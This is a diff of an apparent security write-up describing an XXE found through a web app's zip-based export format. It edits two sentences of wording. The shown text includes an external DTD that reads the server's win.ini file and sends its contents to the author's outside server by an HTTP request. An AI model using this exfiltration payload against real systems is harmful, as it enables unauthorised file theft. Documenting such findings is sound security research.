@@ -46,7 +46,7 @@ Then Burp Intruder was used to iterate through the top 1000 ports. The open port
 
 ## Case Study #2: XXE via Proprietary Filetype
 
-I stumbled upon this next XXE completely by accident. The web site had functionality that allowed users to build “apps”. Apps could be exported to a propriety file extension that I did not recognize. Upon running `strings` on one of these files I discovered it was a zip file. Upon unzipping the file, I was greeted by a beautiful site.
+I stumbled upon this next XXE completely by accident. The web site had functionality that allowed users to build “apps”. Apps could be exported to a propriety file type that I did not recognize. Upon running `strings` on one of these files I discovered it was a zip file. Upon unzipping the file, I was greeted by a beautiful site.
 
 ![](/assets/images/XXE/3.png)  
 
@@ -57,7 +57,7 @@ Next, I replaced the contents of one of the XML files with the following XXE pay
 <cinzinga>&e1;</cinzinga>
 ```
 
-And the contents of `/test.dtd` are shown below:
+And the contents of `/test.dtd` hosted on my web server are shown below:
 ```
 <!ENTITY % p1 SYSTEM "file:///windows/win.ini">
 <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://poc.cinzinga.com/?x=%p1;'>">
